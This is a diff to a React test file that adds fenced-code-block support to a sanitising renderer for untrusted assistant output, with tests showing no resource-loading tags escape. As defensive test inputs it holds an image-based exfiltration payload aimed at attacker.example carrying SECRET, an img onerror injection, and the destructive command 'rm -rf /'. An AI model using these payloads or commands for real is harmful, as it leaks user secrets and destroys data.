@@ -61,7 +61,7 @@ const HOSTILE = [
  * judge only those.
  */
 const ALLOWED_TAGS = new Set([
-  'div', 'p', 'h3', 'h4', 'ul', 'ol', 'li', 'span', 'strong', 'em', 'code',
+  'div', 'p', 'h3', 'h4', 'ul', 'ol', 'li', 'span', 'strong', 'em', 'code', 'pre',
 ]);
 
 /** Real markup only: escaped payload text is `&lt;`, and never matches this. */
@@ -137,5 +137,87 @@ describe('INV-9 — the renderer cannot be made to fetch or navigate', () => {
     for (const junk of ['', '   ', '*'.repeat(5000), '#'.repeat(500), '`'.repeat(999), '\u0000\uFFFD']) {
       expect(() => renderToStaticMarkup(<UntrustedText text={junk} />)).not.toThrow();
     }
+  });
+});
+
+describe('fenced code blocks — S4', () => {
+  /**
+   * The assistant emits fenced code, and this project's whole use case is
+   * repository remediation advice. Without fence support a user was shown
+   * literal ``` lines with the code reflowed into a paragraph.
+   *
+   * A <pre><code> of an escaped string is inside the safe subset: it triggers
+   * no network request, loads no resource and runs nothing. The reason a
+   * markdown LIBRARY is still refused is unchanged — a library also brings
+   * images, links and raw HTML, and those are the exfiltration surface.
+   */
+  const html = (t: string) => renderToStaticMarkup(<UntrustedText text={t} />);
+
+  it('renders a fence as pre/code', () => {
+    const out = html('Try this:\n```\nnpm run build\n```\n');
+    expect(out).toContain('<pre');
+    expect(out).toContain('<code');
+    expect(out).toContain('npm run build');
+  });
+
+  it('does not format inside a fence', () => {
+    // Inside code, ** is two asterisks. Formatting it would misrepresent the
+    // code the user is about to run.
+    const out = html('```\nconst a = **b**;\n```');
+    expect(out).not.toContain('<strong>');
+    expect(out).toContain('**b**');
+  });
+
+  it('preserves newlines and indentation', () => {
+    const out = html('```\nif (x) {\n  go();\n}\n```');
+    expect(out).toContain('if (x) {\n  go();\n}');
+  });
+
+  it('a payload inside a fence still emits no resource-loading tag', () => {
+    const { offenders, tags } = auditRender(
+      '```\n![x](https://attacker.example/f.png?d=SECRET)\n<img src="https://attacker.example/i.png">\n```',
+    );
+    expect(offenders).toEqual([]);
+    expect(tags.map(tagName).filter((t) => t === 'img')).toEqual([]);
+  });
+
+  it('a closing fence must be at least as long as the opener', () => {
+    // A short run inside a block must not end it early, or the rest of an
+    // attacker's payload escapes the code context and gets formatted.
+    const out = html('````\nnot ``` a closer\nstill code\n````');
+    expect(out).toContain('not ``` a closer');
+    expect(out).toContain('still code');
+    expect((out.match(/<pre/g) ?? []).length).toBe(1);
+  });
+
+  it('an unterminated fence stays code to the end', () => {
+    // The safe direction: everything after it is rendered literally rather
+    // than being formatted. Falling back to paragraphs would apply inline
+    // formatting to text an attacker chose.
+    const out = html('```\nrm -rf /\n**not bold**');
+    expect(out).toContain('<pre');
+    expect(out).not.toContain('<strong>');
+    expect(out).toContain('**not bold**');
+  });
+
+  it('shows a language label only for a plain token', () => {
+    expect(html('```bash\nls\n```')).toContain('bash');
+    // Anything that is not a bare identifier is dropped rather than displayed.
+    const weird = html('```<img src=x onerror=1>\nls\n```');
+    expect(weird).not.toContain('onerror');
+    expect(weird).toContain('ls');
+  });
+
+  it('a fence does not swallow the text after it', () => {
+    const out = html('before\n```\ncode\n```\nafter');
+    expect(out).toContain('before');
+    expect(out).toContain('after');
+    expect(out).toContain('code');
+  });
+
+  it('tildes open a fence too, and backticks do not close one', () => {
+    const out = html('~~~\ncode ``` here\n~~~');
+    expect(out).toContain('code ``` here');
+    expect((out.match(/<pre/g) ?? []).length).toBe(1);
   });
 });
